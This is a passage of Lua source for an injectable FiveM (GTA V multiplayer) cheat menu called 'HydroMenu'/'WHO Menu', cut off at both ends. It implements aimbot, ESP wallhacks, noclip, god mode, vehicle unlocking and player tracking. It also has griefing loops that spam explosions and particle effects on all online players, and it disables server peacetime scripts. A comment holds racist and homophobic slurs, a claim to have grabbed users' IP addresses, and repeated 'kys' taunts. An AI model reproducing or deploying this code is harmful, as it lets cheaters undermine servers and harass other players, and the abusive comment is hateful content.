			SetEntityLocallyVisible(PlayerPedId())
			SetEntityCollision(PlayerPedId(), true, true)
            ResetEntityAlpha(PlayerPedId())
			FreezeEntityPosition(PlayerPedId(), false)
			FreezeEntityPosition(vehicle, false)
			ResetEntityAlpha(vehicle)
			DisableControlAction(0, 85, false)
		end

		while noclipping and not killmenu do
			DisableControlAction(0, 85, true)
			if IsPedInAnyVehicle(PlayerPedId(), true) then
				local vehicle = GetVehiclePedIsIn(PlayerPedId())
				local heading = GetEntityHeading(vehicle)
				SetEntityCollision(vehicle, false, false)
				FreezeEntityPosition(vehicle, true)

				if IsDisabledControlPressed(0, 32) then -- W
					local coords = GetOffsetFromEntityInWorldCoords(vehicle, 0.0, NoclipSpeed, 0.0)
					local z = GetEntityCoords(vehicle).z
					SetEntityCoords(vehicle, coords.x, coords.y, z - 0.55, 0.0, 0.0, 0.0, false)
				end
				if IsDisabledControlPressed(0, 31) then -- S
					local coords = GetOffsetFromEntityInWorldCoords(vehicle, 0.0, -NoclipSpeed, 0.0)
					local z = GetEntityCoords(vehicle).z
					SetEntityCoords(vehicle, coords.x, coords.y, z - 0.55, 0.0, 0.0, 0.0, false)
				end
				if IsDisabledControlPressed(0, 34) then -- A
					SetEntityHeading(vehicle, heading + 2)
				end
				if IsDisabledControlPressed(0, 30) then -- D
					SetEntityHeading(vehicle, heading - 2)
				end
				if IsDisabledControlPressed(0, 20) then -- Z
					local coords = GetEntityCoords(vehicle)
					SetEntityCoords(vehicle, coords.x, coords.y, coords.z - NoclipSpeed * 2, 0.0, 0.0, 0.0, false)
				end
				if IsDisabledControlPressed(0, 44) then -- Q
					local coords = GetEntityCoords(vehicle)
					SetEntityCoords(vehicle, coords.x, coords.y, coords.z + NoclipSpeed, 0.0, 0.0, 0.0, false)
				end
			else
				local heading = GetEntityHeading(PlayerPedId())
				SetEntityCollision(PlayerPedId(), false, false)
				FreezeEntityPosition(PlayerPedId(), true)
				SetEntityAlpha(PlayerPedId(), 0.05, false)
				if IsDisabledControlPressed(0, 32) then -- W
					local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, NoclipSpeed, 0.0)
					
					SetEntityVelocity(PlayerPedId(), 0.0, 0.0, 0.0)
					SetEntityRotation(PlayerPedId(), 0.0, 0.0, 0.0, 0, false)
					SetEntityHeading(PlayerPedId(), heading)
					SetEntityCoordsNoOffset(PlayerPedId(), coords.x, coords.y, coords.z, noclipping, noclipping, noclipping)

					--SetEntityCoords(PlayerPedId(), coords.x, coords.y, coords.z - 1, 0.0, 0.0, 0.0, false)
				end
				if IsDisabledControlPressed(0, 31) then -- S
					local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -NoclipSpeed, 0.0)
					
					SetEntityVelocity(PlayerPedId(), 0.0, 0.0, 0.0)
					SetEntityRotation(PlayerPedId(), 0.0, 0.0, 0.0, 0, false)
					SetEntityHeading(PlayerPedId(), heading)
					SetEntityCoordsNoOffset(PlayerPedId(), coords.x, coords.y, coords.z, noclipping, noclipping, noclipping)

				end
				if IsDisabledControlPressed(0, 34) then -- A
					SetEntityHeading(PlayerPedId(), heading + 2)
				end
				if IsDisabledControlPressed(0, 30) then -- D
					SetEntityHeading(PlayerPedId(), heading - 2)
				end
				if IsDisabledControlPressed(0, 20) then -- Z
					local coords = GetEntityCoords(PlayerPedId())
					SetEntityVelocity(PlayerPedId(), 0.0, 0.0, 0.0)
					SetEntityRotation(PlayerPedId(), 0.0, 0.0, 0.0, 0, false)
					SetEntityHeading(PlayerPedId(), heading)
					SetEntityCoordsNoOffset(PlayerPedId(), coords.x, coords.y, coords.z - NoclipSpeed * 2, noclipping, noclipping, noclipping)
				end
				if IsDisabledControlPressed(0, 44) then -- Q
					local coords = GetEntityCoords(PlayerPedId())
					SetEntityVelocity(PlayerPedId(), 0.0, 0.0, 0.0)
					SetEntityRotation(PlayerPedId(), 0.0, 0.0, 0.0, 0, false)
					SetEntityHeading(PlayerPedId(), heading)
					SetEntityCoordsNoOffset(PlayerPedId(), coords.x, coords.y, coords.z + NoclipSpeed, noclipping, noclipping, noclipping)
				end
			end

			if IsDisabledControlJustReleased(0, 21) then -- Shift
				NoclipSpeed = NoclipSpeed + 1.0
		
				if NoclipSpeed > 15.0 then
					NoclipSpeed = 1.0
				end
			end

			RoundedNoClipSpeed = tonumber(string.format("%.0f", NoclipSpeed))

            Wait(0)
	    end
	end)
end

local PVRemoteControlButtons = {
	{
		["label"] = "Toggle Camera",
		["button"] = "~INPUT_DETONATE~"
	},
}

local BottomTextEntries = {}
local YLoc = 1.02

Citizen.CreateThread(function()
	while not killmenu do
		
		for i = 1, #BottomTextEntries do
			CurEntry = BottomTextEntries[i]
	        XWidth = HydroMenu.GetTextWidth(CurEntry, 4, 0.45) + 0.01
			DrawY = i * 0.0455
			
			if XWidth < 0.12 then
				XWidth = 0.12
			end

			HydroMenu.DrawRect(0.5, YLoc - DrawY, XWidth, 0.04, { r = 0, g = 0, b = 0, a = 200 })

			HydroMenu.DrawRect(0.5, YLoc - 0.019 - DrawY, XWidth, 0.002, { r = rgb.r, g = rgb.g, b = rgb.b, a = 255 })

			HydroMenu.DrawText(CurEntry, { 0.500, YLoc - 0.015 - DrawY }, {255, 255, 255, 255}, 0.45, 4, 1)

		end

		BottomTextEntries = {}
		Wait(0)
	end
end)

function HydroMenu.DrawBottomText(text) 
	table.insert(BottomTextEntries, #BottomTextEntries + 1, text)
end

local prevframes, prevtime, curtime, curframes, fps = 0, 0, 0, 0, 0

function GetFPS()
	curtime = GetGameTimer()
	curframes = GetFrameCount()
	
	if (curtime - prevtime) > 1000 then
		fps = (curframes - prevframes) - 1              
		prevtime = curtime
		prevframes = curframes
	end

	if fps > 1000 then
		return "N/A"
	end

	return fps
end

BulletCoords = {}

function DeleteInSeconds(Table, Time)
	Citizen.CreateThread(function()
		Wait(Time)
		table.remove(Table, 1)
	end)
end

local Targets = 0

-- PTFX Loop for any niggers seeing this we made everything here name 1 menu you seen this from faggots niggers we have your ip just from injecting this menu kys kys kys kys kys 


Citizen.CreateThread(function()
	while not killmenu do
		RemoveParticleFx("scr_indep_firework_trailburst", 1)
		RemoveParticleFx("scr_ex1_plane_exp_sp", 1)
		RemoveParticleFx("scr_clown_appears", 1)
		RemoveParticleFx("td_blood_throat", 1)

		OnlinePlayers = GetActivePlayers()

		if HydroVariables.AllOnlinePlayers.ParicleEffects.HugeExplosionSpam then
			for i = 1, #OnlinePlayers do 

				local ped = GetPlayerPed(OnlinePlayers[i])
				local pedcoords = GetEntityCoords(ped)
				
				RequestNamedPtfxAsset("scr_exile1")
		    
				UseParticleFxAssetNextCall("scr_exile1")
				StartNetworkedParticleFxNonLoopedAtCoord("scr_ex1_plane_exp_sp", pedcoords, 0.0, 0.0, 0.0, 20.0, false, false, false, false)

			end
		end
		
		if HydroVariables.AllOnlinePlayers.ParicleEffects.ClownLoop then
			for i = 1, #OnlinePlayers do 
			
				local ped = GetPlayerPed(OnlinePlayers[i])
				local pedcoords = GetEntityCoords(ped)

				RequestNamedPtfxAsset("scr_rcbarry2")
	
				UseParticleFxAssetNextCall("scr_rcbarry2")
				StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears", pedcoords, 0.0, 0.0, 0.0, 20.0, false, false, false, false)

			end
		end

		if HydroVariables.AllOnlinePlayers.ParicleEffects.BloodLoop then
			for i = 1, #OnlinePlayers do 
			
				local ped = GetPlayerPed(OnlinePlayers[i])
				local pedcoords = GetEntityCoords(ped)

				RequestNamedPtfxAsset("core")
	
				UseParticleFxAssetNextCall("core")
				StartNetworkedParticleFxNonLoopedAtCoord("td_blood_throat", pedcoords, 0.0, 0.0, 0.0, 200.0, false, false, false, false)

			end
		end

		if HydroVariables.AllOnlinePlayers.ParicleEffects.FireworksLoop then
			for i = 1, #OnlinePlayers do 
			
				local ped = GetPlayerPed(OnlinePlayers[i])
				local pedcoords = GetEntityCoords(ped)

				RequestNamedPtfxAsset("scr_indep_fireworks")
	
				UseParticleFxAssetNextCall("scr_indep_fireworks")
				StartNetworkedParticleFxNonLoopedAtCoord("scr_indep_firework_trailburst", pedcoords, 0.0, 0.0, 0.0, 200.0, false, false, false, false)

			end
		end

		Wait(750)
	end
end)

-- Secondary Loop

Citizen.CreateThread(function()
	while not killmenu do
		if HydroVariables.WeaponOptions.AimBot.Enabled and HydroVariables.WeaponOptions.AimBot.DrawFOV and not IsControlPressed(0, 37) then
			if not HasStreamedTextureDictLoaded('mpmissmarkers256') then 
				RequestStreamedTextureDict('mpmissmarkers256', true) 
			end

			HydroMenu.DrawSprite('mpmissmarkers256', 'corona_shade', 0.5, 0.5, HydroVariables.WeaponOptions.AimBot.FOV, HydroVariables.WeaponOptions.AimBot.FOV * HydroMenu.ScreenWidth / HydroMenu.ScreenHeight, 0.0, 0, 0, 0, 100)
		end


		HydroMenu.ScreenWidth, HydroMenu.ScreenHeight = Citizen.InvokeNative(0x873C9F3104101DD3, Citizen.PointerValueInt(), Citizen.PointerValueInt())
		HydroMenu.rgb = HydroMenu.RGBRainbow(1)
		
		if HydroVariables.MenuOptions.Watermark then
			DisplayText = "WHO Menu | FPS: " .. GetFPS() .. " | Resource: " ..GetCurrentResourceName()
			HydroMenu.DrawBottomText(DisplayText)
		end
		
		if noclipping then
			HydroMenu.DrawBottomText("Noclip | Speed "..RoundedNoClipSpeed.. "m")
		end
		
		if HydroVariables.SelfOptions.InfiniteCombatRoll then
			for i = 0, 3 do
				StatSetInt(GetHashKey("mp" .. i .. "_shooting_ability"), 9999, true)
				StatSetInt(GetHashKey("sp" .. i .. "_shooting_ability"), 9999, true)
			end
		end

		if HydroVariables.VehicleOptions.speedometer then
			if IsPedInAnyVehicle(PlayerPedId()) then
				local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
				local carSpeed = GetEntitySpeed(veh) * 2.236936 -- convert to mph
				local carkphSpeed = GetEntitySpeed(veh) * 3.6 -- convert to kph
				carspeedround = tonumber(string.format("%.0f", carSpeed))
				carkphspeedround = tonumber(string.format("%.0f", carkphSpeed))
		
				HydroMenu.DrawBottomText("MPH " .. carspeedround .. " |  KPH " .. carkphspeedround)
			end
		end

		if IsDisabledControlPressed(0, 19) and IsDisabledControlPressed(0, 29) then -- Reset Open Key
			Ham.printStr("Hydro Menu", "Keybind Reset\n")
			openKey = 208
		end
		
		if IsDisabledControlPressed(0, 19) and IsDisabledControlPressed(0, 73) then -- Kill Menu
			killmenu = true
		end

		if IsDisabledControlPressed(0, 19) and IsDisabledControlPressed(0, 80) then -- Kill Menu
			HydroMenu.UI.GTAInput = true
		end

		rgb = HydroMenu.RGBRainbow(1)

		year, month, day, hour, minute, second = GetLocalTime()

		if HydroVariables.WeaponOptions.NoRecoil and IsDisabledControlPressed(0, 24) then
			local GameplayCamPitch = GetGameplayCamRelativePitch()
			SetGameplayCamRelativePitch(GameplayCamPitch, 0.0)
		end

		if HydroVariables.WeaponOptions.Tracers then
			local _, weapon = GetCurrentPedWeapon(PlayerPedId())
			if weapon ~= -1569615261 then
				local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
				local launchPos = GetEntityCoords(wepent)
				local targetPos = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 2000.0)
				if IsPedShooting(PlayerPedId()) then
					Hit, ImpactCoord = GetPedLastWeaponImpactCoord(PlayerPedId())
					LineToInsertOn = tablelength(BulletCoords) + 1
					Coords = table.pack(launchPos, targetPos, ImpactCoord)
					table.insert(BulletCoords, LineToInsertOn, Coords)
					DeleteInSeconds(BulletCoords, 3 * 1000)
				end
			end
	
			for i = 1, #BulletCoords do
				CurBullet = BulletCoords[i]
				if CurBullet ~= nil then     
					launchPos = CurBullet[1]
					TargetPos = CurBullet[2]
					ImpactCoord = CurBullet[3]			
					Lx, Ly, Lz = table.unpack(ImpactCoord)

					DrawMarker(28, ImpactCoord, 0, 0, 0, 0, 0, 0, 0.051, 0.051, 0.051, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 200, 0, 0, 0, 0)

					if Lx ~= 0.0 and Ly ~= 0.0 and Lz ~= 0.0 then
						DrawLine(launchPos.x, launchPos.y, launchPos.z, ImpactCoord.x, ImpactCoord.y, ImpactCoord.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
					else
						DrawLine(launchPos.x, launchPos.y, launchPos.z, TargetPos.x, TargetPos.y, TargetPos.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
					end
				end
			end
		end

		if IsControlJustReleased(0, tonumber(HydroVariables.Keybinds.NoClipKey)) then -- No Clip
			NoClip()
		end

		if HydroVariables.Keybinds.RefilHealthKey and IsDisabledControlJustPressed(0, tonumber(HydroVariables.Keybinds.RefilHealthKey)) then
            SetEnitityHealth(PlayerPedId(), 200)
		end

		if HydroVariables.Keybinds.RefilArmourKey and IsDisabledControlJustPressed(0, tonumber(HydroVariables.Keybinds.RefilArmourKey)) then
            SetPedArmour(PlayerPedId(), 100)
		end

		if IsControlPressed(0, tonumber(HydroVariables.Keybinds.DriftMode)) then
			SetVehicleReduceGrip(GetVehiclePedIsUsing(PlayerPedId()), true)
		else
			SetVehicleReduceGrip(GetVehiclePedIsUsing(PlayerPedId()), false)
		end

		if killmenu then
            break
		end
		
		if HydroVariables.MiscOptions.UnlockAllVehicles then
			for Vehicle in EnumerateVehicles() do
				SetVehicleDoorsLockedForPlayer(Vehicle, PlayerId(), false)
			end
		end

		if HydroVariables.OnlinePlayer.TrackingPlayer then

			local coords = GetEntityCoords(GetPlayerPed(HydroVariables.OnlinePlayer.TrackingPlayer))
			SetNewWaypoint(coords.x, coords.y)
		end

		if HydroVariables.VehicleOptions.PersonalVehicleCam then
			
			local camCoords = GetCamCoord(HydroVariables.VehicleOptions.PersonalVehicleCam)

			SetFocusEntity(HydroVariables.VehicleOptions.PersonalVehicle)
			
			SetCamRot(HydroVariables.VehicleOptions.PersonalVehicleCam, -2.0, 0.0, GetEntityHeading(HydroVariables.VehicleOptions.PersonalVehicle), 0)
		end

		if HydroVariables.VehicleOptions.rainbowcar then
			local vehicle = GetVehiclePedIsIn(PlayerPedId())
			SetVehicleCustomPrimaryColour(vehicle, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b)
			SetVehicleCustomSecondaryColour(vehicle, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b)
			SetVehicleTyreSmokeColor(vehicle, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b)
		end
		
		if rgbhud then
			ReplaceHudColourWithRgba(116, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
		end

		if HydroVariables.VehicleOptions.vehgodmode then
			SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
		end

		if HydroVariables.VehicleOptions.AutoClean then
			SetVehicleDirtLevel(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
		end

		if HydroVariables.VehicleOptions.PersonalVehicle == false or DoesEntityExist(HydroVariables.VehicleOptions.PersonalVehicle) == false then
			HydroVariables.VehicleOptions.PersonalVehicleESP = false
			HydroVariables.VehicleOptions.PersonalVehicleMarker = false
			PVLocked = false
		end

		if HydroVariables.VehicleOptions.PersonalVehicleCam then
			RenderScriptCams(true, false, 0, true, false)
		end

		if HydroVariables.SelfOptions.FreezeWantedLevel then
			if HydroVariables.SelfOptions.FrozenWantedLevel > 0 then
				SetPlayerWantedCentrePosition(PlayerId(), GetEntityCoords(PlayerPedId()))
				SetPlayerWantedLevel(PlayerId(), HydroVariables.SelfOptions.FrozenWantedLevel + 1, true)
				SetPlayerWantedLevelNow(PlayerId())
				SetPlayerWantedLevel(PlayerId(), HydroVariables.SelfOptions.FrozenWantedLevel, true)
				SetPlayerWantedLevelNow(PlayerId())
			else
				SetPlayerWantedLevel(PlayerId(), 0, true)
				SetPlayerWantedLevelNow(PlayerId())
			end
		end

		if HydroVariables.VehicleOptions.PersonalVehicleESP then
			plycoords = GetEntityCoords(PlayerPedId())
			coords = GetEntityCoords(HydroVariables.VehicleOptions.PersonalVehicle)
			
			local retval, screenX, screenY = GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)

			local DistanceToCar = GetDistanceBetweenCoords(plycoords.x, plycoords.y, plycoords.z, coords.x, coords.y, coords.z, true)

			HydroMenu.DrawText("Personal Vehicle\nDistance: " .. string.format("%.2f", DistanceToCar) .. "m", { screenX, screenY }, {HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255}, 0.45, 4, 1)
		end

		if HydroVariables.VehicleOptions.PersonalVehicleMarker then
			coords = GetEntityCoords(HydroVariables.VehicleOptions.PersonalVehicle)
			if blip == nil then
				blip = AddBlipForCoord(coords.x, coords.y, coords.z)
				SetBlipSprite(blip, 1)
				SetBlipDisplay(blip, 4)
				SetBlipScale(blip, 0.9)
				SetBlipColour(blip, 3)
				SetBlipAsShortRange(blip, true)
				BeginTextCommandSetBlipName("STRING")
				AddTextComponentString("Personal Vehicle")
				EndTextCommandSetBlipName(blip)
			end

			SetBlipDisplay(blip, 2)
			SetBlipCoords(blip, coords.x, coords.y, coords.z)
		else 
			SetBlipDisplay(blip, 0)
		end

		if HydroVariables.VehicleOptions.Waterproof then
            SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId()), true, true, true)
		end

		if HydroVariables.VehicleOptions.InstantBreaks then
			if IsDisabledControlPressed(0, 33) and IsPedInAnyVehicle(PlayerPedId()) then
				local ped = GetPlayerPed(-1)
				local playerVeh = GetVehiclePedIsIn(ped, false)

				SetVehicleForwardSpeed(playerVeh, 0.0)
			end
		end

	    if HydroVariables.VehicleOptions.EasyHandling and IsPedInAnyVehicle(PlayerPedId()) then
			local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
			SetVehicleGravityAmount(veh, 60.0)
		end

		if HydroVariables.VehicleOptions.DriveOnWater then
			x, y, z = table.unpack(GetEntityCoords(GetPlayersLastVehicle()))
			sucess, z = GetWaterHeight(x, y, z)
			if sucess and HydroVariables.VehicleOptions.DriveOnWaterProp then
				SetEntityVisible(HydroVariables.VehicleOptions.DriveOnWaterProp, false, false)
				SetEntityCoords(HydroVariables.VehicleOptions.DriveOnWaterProp, x, y, z)
				SetEntityHeading(HydroVariables.VehicleOptions.DriveOnWaterProp, GetEntityHeading(PlayerPedId()))
			elseif not sucess then
				SetEntityCoords(HydroVariables.VehicleOptions.DriveOnWaterProp, x, y, z - 100.5)
			end
		end

		if HydroVariables.VehicleOptions.AlwaysWheelie then
			local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
			if IsPedInAnyVehicle(PlayerPedId()) and GetPedInVehicleSeat(GetVehiclePedIsIn(PlayerPedId()), -1) == PlayerPedId() then
				SetVehicleWheelieState(veh, 129)
			end
		end

		if HydroVariables.VehicleOptions.speedboost then
			DisableControlAction(0, 86, true)
			if IsDisabledControlPressed(0, 86) and IsPedInAnyVehicle(PlayerPedId()) then
				local ped = GetPlayerPed(-1)
				local playerVeh = GetVehiclePedIsIn(ped, false)
				
				SetVehicleForwardSpeed(playerVeh, 336.0)
			end
		end

		if HydroVariables.VehicleOptions.activeenignemulr then
			local vehicle = GetPlayersLastVehicle()
			local curractiveenignemulrIndex = HydroVariables.VehicleOptions.curractiveenignemulrIndex
			if curractiveenignemulrIndex == 1 then
				SetVehicleEnginePowerMultiplier(vehicle, 2.0)
			elseif curractiveenignemulrIndex == 2 then
			    SetVehicleEnginePowerMultiplier(vehicle, 4.0)
			elseif curractiveenignemulrIndex == 3 then
			    SetVehicleEnginePowerMultiplier(vehicle, 8.0)
			elseif curractiveenignemulrIndex == 4 then
			    SetVehicleEnginePowerMultiplier(vehicle, 16.0)
			elseif curractiveenignemulrIndex == 5 then
			    SetVehicleEnginePowerMultiplier(vehicle, 32.0)
			elseif curractiveenignemulrIndex == 6 then
			    SetVehicleEnginePowerMultiplier(vehicle, 64.0)
			elseif curractiveenignemulrIndex == 7 then
			    SetVehicleEnginePowerMultiplier(vehicle, 128.0)
			elseif curractiveenignemulrIndex == 8 then
			    SetVehicleEnginePowerMultiplier(vehicle, 256.0)
			elseif curractiveenignemulrIndex == 9 then
			    SetVehicleEnginePowerMultiplier(vehicle, 512.0)
			elseif curractiveenignemulrIndex == 10 then
			    SetVehicleEnginePowerMultiplier(vehicle, 1024.0)
			end
		end

		if HydroVariables.MiscOptions.ESPBox then
            local PlayerList = GetActivePlayers()
			for i = 1, #PlayerList do
				local curplayerped = GetPlayerPed(PlayerList[i])

				bone = GetEntityBoneIndexByName(curplayerped, "SKEL_HEAD")
				x,y,z = table.unpack(GetPedBoneCoords(curplayerped, bone, 0.0, 0.0, 0.0))
				px,py,pz = table.unpack(GetGameplayCamCoord())

				if GetDistanceBetweenCoords(x, y, z, px, py, pz, true) < HydroVariables.MiscOptions.ESPDistance then
					if curplayerped ~= PlayerPedId() and  IsEntityOnScreen(curplayerped) and not IsPedDeadOrDying(curplayerped) then
						z = z + 0.9
						local Distance = GetDistanceBetweenCoords(x, y, z, px, py, pz, true) * 0.002 / 2
						if Distance < 0.0042 then
							Distance = 0.0042
						end
						
						if HydroVariables.MiscOptions.ESPMenuColours then
							color = { r = HydroMenu.rgb.r, g = HydroMenu.rgb.g, b = HydroMenu.rgb.b}
						else
							color = { r = 255, g = 255, b = 255}
						end
	
						retval, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
	
						width = 0.00045
						height = 0.0023
	
						DrawRect(_x, _y, width / Distance, 0.0015, color.r, color.g, color.b, 200)
						DrawRect(_x, _y + height / Distance, width / Distance, 0.0015, color.r, color.g, color.b, 200)
						DrawRect(_x + width / 2 / Distance, _y + height / 2 / Distance , 0.001, height / Distance, color.r, color.g, color.b, 200)
						DrawRect(_x - width / 2 / Distance, _y + height / 2 / Distance , 0.001, height / Distance, color.r, color.g, color.b, 200)
						
						health = GetEntityHealth(curplayerped)
						if health > 200 then
							health = 200
						end

						DrawRect(_x - 0.00028 / Distance, _y + height / 2 / Distance, 0.0016 / Distance * 0.015, height / Distance, 0, 0, 0, 200)
						DrawRect(_x - 0.00028 / Distance, _y + height / Distance - GetEntityHealth(curplayerped) / 175000 / Distance,  0.0016 / Distance * 0.015, GetEntityHealth(curplayerped) / 87500 / Distance, 0, 255, 0, 200)
					
					end
				end
			end
		end
		
		if HydroVariables.MiscOptions.ESPName then
            local PlayerList = GetActivePlayers()
			for i = 1, #PlayerList do
				local curplayerped = GetPlayerPed(PlayerList[i])

				x,y,z = table.unpack(GetPedBoneCoords(curplayerped, 0, 0.0, 0.0, -0.9))
				px,py,pz = table.unpack(GetGameplayCamCoord())

				if GetDistanceBetweenCoords(x, y, z, px, py, pz, true) < HydroVariables.MiscOptions.ESPDistance then
					local retval, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
					local Distance = GetDistanceBetweenCoords(x, y, z, px, py, pz, true) * 0.0002
					if Distance < 1 then
						Distance = 1
					end
					HydroMenu.DrawText(GetPlayerName(PlayerList[i]), { _x, _y }, {HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255}, 0.5 / Distance, 4, 1, 0)	
				end
			end
		end

		if HydroVariables.MiscOptions.ESPBones then
			local playerlist = GetActivePlayers()
			for i = 1, #playerlist do
				local curplayer = playerlist[i]
				local curplayerped = GetPlayerPed(curplayer)
				local PlayerCoords = GetEntityCoords(curplayerped)
				x,y,z = table.unpack(PlayerCoords)

				local RightShoulderBone = GetPedBoneIndex(curplayerped, 31086)
				local RightElbowBone = GetPedBoneIndex(curplayerped, 2992)
				local RightHand = GetPedBoneIndex(curplayerped, 28422)

				local LeftElbowBone = GetPedBoneIndex(curplayerped, 22711)
				local LeftHand = GetPedBoneIndex(curplayerped, 18905)

				local rightshoulder = GetWorldPositionOfEntityBone(curplayerped, RightShoulderBone, 0.0, 0.0, 0.0)
				local rightelbow = GetWorldPositionOfEntityBone(curplayerped, RightElbowBone, 0.0, 0.0, 0.0)
				local rightelhand = GetWorldPositionOfEntityBone(curplayerped, RightHand, 0.0, 0.0, 0.0)
				
				local leftelbow = GetWorldPositionOfEntityBone(curplayerped, LeftElbowBone, 0.0, 0.0, 0.0)
				local lefthand = GetWorldPositionOfEntityBone(curplayerped, LeftHand, 0.0, 0.0, 0.0)

				local pelvis = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 11816), 0.0, 0.0, 0.0)
				local rightknee = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 16335), 0.0, 0.0, 0.0)
				local leftknee = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 46078), 0.0, 0.0, 0.0)
				local leftfoot = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 14201), 0.0, 0.0, 0.0)
				local rightfoot = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 52301), 0.0, 0.0, 0.0)
				
				DrawLine(rightshoulder.x, rightshoulder.y, rightshoulder.z, rightelbow.x, rightelbow.y, rightelbow.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				DrawLine(rightelbow.x, rightelbow.y, rightelbow.z, rightelhand.x, rightelhand.y, rightelhand.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				
				DrawLine(rightshoulder.x, rightshoulder.y, rightshoulder.z, leftelbow.x, leftelbow.y, leftelbow.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				DrawLine(leftelbow.x, leftelbow.y, leftelbow.z, lefthand.x, lefthand.y, lefthand.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				
				DrawLine(rightshoulder.x, rightshoulder.y, rightshoulder.z, pelvis.x, pelvis.y, pelvis.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				DrawLine(rightknee.x, rightknee.y, rightknee.z, pelvis.x, pelvis.y, pelvis.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				DrawLine(leftknee.x, leftknee.y, leftknee.z, pelvis.x, pelvis.y, pelvis.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				
				DrawLine(rightknee.x, rightknee.y, rightknee.z, rightfoot.x, rightfoot.y, rightfoot.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				DrawLine(leftknee.x, leftknee.y, leftknee.z, leftfoot.x, leftfoot.y, leftfoot.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				
				ResetEntityAlpha(curplayerped)
				SetEntityAlpha(curplayerped, 200, true)
			end
		end

		if HydroVariables.MiscOptions.ESPLines then
			local pedcoords = GetEntityCoords(PlayerPedId())

			local playerlist = GetActivePlayers()
			for i = 1, #playerlist do
				local curplayer = playerlist[i]
				local curplayerped = GetPlayerPed(curplayer)
				local PlayerCoords = GetEntityCoords(curplayerped)
				
				DrawLine(pedcoords.x, pedcoords.y, pedcoords.z, PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
			end
		end
		
		if HydroVariables.VehicleOptions.activetorquemulr then
			local vehicle = GetPlayersLastVehicle()
			local curractivetorqueIndex = HydroVariables.VehicleOptions.curractivetorqueIndex
			if curractivetorqueIndex == 1 then
				SetVehicleEngineTorqueMultiplier(vehicle, 2.0)
			elseif curractivetorqueIndex == 2 then
			    SetVehicleEngineTorqueMultiplier(vehicle, 4.0)
			elseif curractivetorqueIndex == 3 then
			    SetVehicleEngineTorqueMultiplier(vehicle, 8.0)
			elseif curractivetorqueIndex == 4 then
			    SetVehicleEngineTorqueMultiplier(vehicle, 16.0)
			elseif curractivetorqueIndex == 5 then
			    SetVehicleEngineTorqueMultiplier(vehicle, 32.0)
			elseif curractivetorqueIndex == 6 then
			    SetVehicleEngineTorqueMultiplier(vehicle, 64.0)
			elseif curractivetorqueIndex == 7 then
			    SetVehicleEngineTorqueMultiplier(vehicle, 128.0)
			elseif curractivetorqueIndex == 8 then
			    SetVehicleEngineTorqueMultiplier(vehicle, 256.0)
			elseif curractivetorqueIndex == 9 then
			    SetVehicleEngineTorqueMultiplier(vehicle, 512.0)
			elseif curractivetorqueIndex == 10 then
			    SetVehicleEngineTorqueMultiplier(vehicle, 1024.0)
			end
		end

		if HydroVariables.OnlinePlayer.cargoplaneloop then
			local coords = GetEntityCoords(GetPlayerPed(HydroVariables.OnlinePlayer.CargodPlayer))
			SpawnVehAtCoords("cargoplane", coords)
		end

		if HydroVariables.OnlinePlayer.attachtoplayer then
			local self = PlayerPedId()
			
			AttachEntityToEntity(self, GetPlayerPed(HydroVariables.OnlinePlayer.attatchedplayer), 0, 0.0, 0.0, 0.0, 0.0, 0.0, 180.0, false, false, true, false, 0, true)
		end
		
		if HydroVariables.ScriptOptions.BlockBlackScreen then
            DoScreenFadeIn(0)
		end

		if HydroVariables.ScriptOptions.BlockPeacetime then
			TriggerEvent("AOP:SendPT", false)
			TriggerEvent("yoda:peacetime", false)
			TriggerEvent("Badssentials:SetPT", false)
		end

		if HydroVariables.SelfOptions.infstamina then
            RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
		end

		if HydroVariables.SelfOptions.superrun then
			if IsDisabledControlPressed(0, 21) and not IsPedRagdoll(PlayerPedId()) then
